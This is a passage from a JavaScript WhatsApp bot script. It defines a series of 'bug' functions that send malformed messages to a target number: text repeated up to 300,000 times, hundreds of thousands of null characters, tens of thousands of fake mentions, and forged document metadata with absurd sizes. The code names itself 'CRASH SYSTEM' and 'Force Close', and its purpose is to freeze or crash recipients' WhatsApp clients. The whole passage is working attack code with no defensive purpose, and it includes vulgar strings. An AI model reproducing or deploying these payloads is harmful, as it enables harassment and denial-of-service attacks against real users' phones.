          ...(await prepareWAMessageMedia({ image: { url: './thumb.png' } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "𝐙𝐘𝐕𝐑𝐋 𝐂𝐨𝐫𝐞",
          hasMediaAttachment: false
        }),
                body: {
                  text: "𝐙𝐘𝐕𝐑𝐋 𝐂𝐨𝐫𝐞" + "ꦾ".repeat(90000)
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"𝗖𝗥𝗔𝗦𝗛 𝗦𝗬𝗦𝗧𝗘𝗠","url":"https://t.me/varelmek","merchant_url":"https://t.me/varelmek"}`
                    },
                  ],
                },
              },
              {               
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './thumb.png' } }, { upload: sock.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: "𝐙𝐘𝐕𝐑𝐋 𝐂𝐨𝐫𝐞",
          hasMediaAttachment: false
        }),
                body: {
                  text: "𝐙𝐘𝐕𝐑𝐋 𝐂𝐨𝐫𝐞" + "ꦾ".repeat(90000)
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"  𝗖𝗥𝗔𝗦𝗛 𝗦𝗬𝗦𝗧𝗘𝗠","url":"https://t.me/varelmek","merchant_url":"https://t.me/varelmek"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);
await sock.relayMessage(target, etc.key.remoteJid, etc.message, {
  messageId: etc.key.id,
});
}
 async function BugFreeze(target, ptcp = false) {
let virtex = "𝐂𝐑𝐀𝐒𝐇 𝐔𝐈";
await sock.relayMessage(target, {
groupMentionedMessage: {
message: {
interactiveMessage: {
header: {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0
},
hasMediaAttachment: true
},
body: {
text: virtex + "ꦾ".repeat(90000)+"@6285655649546".repeat(50000)
},
nativeFlowMessage: {},
contextInfo: {
 mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
 groupMention: [{ groupJid: "0@s.whatsapp.net", groupSubject: "FFFRL" }]
}
}
}
}
}, { participant: { jid: target, quoted: TypeNull } }, { messageId: null });
}
async function locasifreeze2(target, ptcp = false) {
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "VRLZ" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
 async function locasifreeze(target, ptcp = false) {
   let mark = '0@s.whatsapp.net';
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𒁂𝐕𝐑𝐋𒁂𝐕𝐈𝐑𝐔𝐒𒁂"+"@6285655649546".repeat(109999)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function prizlog(target, ptcp = false) {
         let mark = '0@s.whatsapp.net';
                const NeroFile = {
          url: "./image/music.mp3"
        };
 await sock.relayMessage(target, {
            document: NeroFile,
            fileName: "Relvz" + weg,
            mimetype: "application/zip",
            caption: `@${mark.split('@')[0]}@${mark.split('@')[0]}@${mark.split('@')[0]}@${mark.split('@')[0]}`.repeat(109999),
            pageCount: 999999999,
            contextInfo: {
              mentionedJid: [mark],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '120363144038483540@newsletter',
                newsletterName: 'relzGacor',
                serverMessageId: 1
              },
            }
          }, {
            participant: {
              jid: target
            }
          }, {
            messageId: null
          });
        }
async function bugnew(target, ptcp = true) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];
let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "𝐙ᗴ𝐓ׁׅ᥎ꭈׁᒪ 𝐂ꋪ𝐀𝚂𝐇" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🤓 VR - L",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© VRL V14",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: " VR - L"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/varelmek",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! VRL - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `- VRL V14 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : VRL V14 "
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}
await sock.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
    async function VrlXRobust(target, o, Ptcp = true) {
	const jids = `_*~@13135550002~*_\n`.repeat(10200);
	const ui = 'ꦽ'.repeat(1500);
   await sock.relayMessage(target, {
     ephemeralMessage: {
      message: {
       interactiveMessage: {
        header: {
         documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
          fileLength: "9999999999999",
          pageCount: 1316134911,
          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
          fileName: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝",
          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1726867151",
          contactVcard: true,
          jpegThumbnail: o,
         },
         hasMediaAttachment: true,
        },
									body: { text: 'ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝' + ui + jids },
									contextInfo: {
										mentionedJid: ['13135550002@s.whatsapp.net'],
										mentions: ['13135550002@s.whatsapp.net'],
										},
								    footer: { text: '' },
									nativeFlowMessage: {},
        contextInfo: {
         mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
          length: 30000
         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
         forwardingScore: 1,
         isForwarded: true,
         fromMe: false,
         participant: "0@s.whatsapp.net",
         remoteJid: "status@broadcast",
         quotedMessage: {
          documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
           fileLength: "9999999999999",
           pageCount: 1316134911,
           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
           fileName: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝",
           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
           mediaKeyTimestamp: "1724474503",
           contactVcard: true,
           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
           jpegThumbnail: "",
          },
         },
        },
       },
      },
     },
    },
    Ptcp ? {
     participant: {
      jid: target
     }
    } : {}
   );
	}
  async function sendOfferCall(target) {
    try {
        await sock.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
async function xgc4(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝" + "ꦾ".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await sock.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err);
            }
        }
async function BugMain(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];
let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "🩸"
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "Bro can your please help me",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝 \"👋\"",
                    footerText: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: o,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/varelmek",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝 - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝",
thumbnail: o,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363222395675670@newsletter",
serverMessageId: 1,
newsletterName: `ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}
await sock.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
//function bug
    async function CrashOld(target, ptcp = false) {
      let sections = [];
      for (let i = 0; i < 10; i++) {
        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: "",
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };
      let msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "VRL",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false,
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: target }
      );
      await sock.relayMessage(
        target,
        msg.message,
        ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
      console.log("───「 CRASH OLD 」───");
    }
		async function ClPm(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: " ᥴ𝕽𝐀ꇙհ - Assistant"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" # trashdex - explanation \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"𝐏𝐚͢𝐢𝐧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭 ༆" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐏𝐚𝐢𝐧𝐳𝐲 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"𝐏𝐚͢𝐢𝐧 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭 ༆\",\"sections\":[{\"title\":\"𝐏𝐚𝐢𝐧𝐳𝐲 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: xXxX
				}
			);
			await sock.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};
async function Freezebug(target, Ptcp = true) {
         let jids = "_*~_ᥴ𝕽𝐀ꇙհ_~*_\n".repeat(19890);
         let ui = "ꦾ".repeat(5555);
                 await sock.relayMessage(target, {
                              ephemeralMessage: {
                              message: {
                               interactiveMessage: {
                                           header: {
                                  documentMessage: {
                                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                  fileLength: "9999999999999",
                                  pageCount: 1316134911,
                                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                  fileName: "@62895351855189".repeat(100),
                                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                  directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                  mediaKeyTimestamp: "1726867151",
                                  contactVcard: true,
                                 jpegThumbnail: "https://files.catbox.moe/day7qu.jpg",
                                },
                                    hasMediaAttachment: true,
                                  },
         body: { 
                                        text: "I'am ᥴ𝕽𝐀ꇙհ Broww"+"@6285817856153".repeat(6) + ui + jids 
                                    },
         contextInfo: {
          mentionedJid: ['0@s.whatsapp.net'],
          mentions: ['0@s.whatsapp.net'],
          },
            footer: { text: '' },
         nativeFlowMessage: {},
                                      contextInfo: {
                                      mentionedJid: ["0@s.whatsapp.net", ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
                                      forwardingScore: 1,
                                       isForwarded: true,
                                         fromMe: false,
                                         participant: "0@s.whatsapp.net",
                                         remoteJid: "status@broadcast",
                                             quotedMessage: {
                                             documentMessage: {
                                             url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                             mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                             fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                             fileLength: "9999999999999",
                                             pageCount: 1316134911,
                                             mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                             fileName: "@6285817856153".repeat(100),
                                             fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                             directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                              mediaKeyTimestamp: "1724474503",
contactVcard: true,
                                               thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                               thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                               thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                                jpegThumbnail: "",
                                                   },
                                              },
                                          },
                                     },
                                 },
                             },
                          },
                           Ptcp ? {
                            participant: {
                            jid: target
                          }
                           } : {}
                          );
                     }
async function documentfreeze2(zLoc, ptcp = false) {
    let uitext = "ѵʀ꒒" +  "꧀ *~@0~*".repeat(50000);
    await sock.relayMessage(zLoc, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4core&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
                            fileSha256: "7SXMgNYBO4tkPSk3W46FQ3hUcK6K6G3//TiB5/ibhwg=",
                            fileLength: "829710112",
                            pageCount: 0x9184e729fff,
                            mediaKey: "/gaasVF/Lt68CK4sy5DTRhJDQls+RwNDwU6yhGZjPCk=",
                            fileName: "@ѵʀ꒒@",
                            fileEncSha256: "nRvyfj/ky0+6upJrQMnwtuXm6lye2RuavfYM+cVl0hU=",
                            directPath: "v/t62.7119-24/30509355_1747184032799742_6644078360623643154_n.enc?ccb=11-4&oh=01_Q5AaIPoclG-9z7kzCK-pmRgL9Ss5OAsStWN10HK02vW8OfFg&oe=676BC4core&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1732537847",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
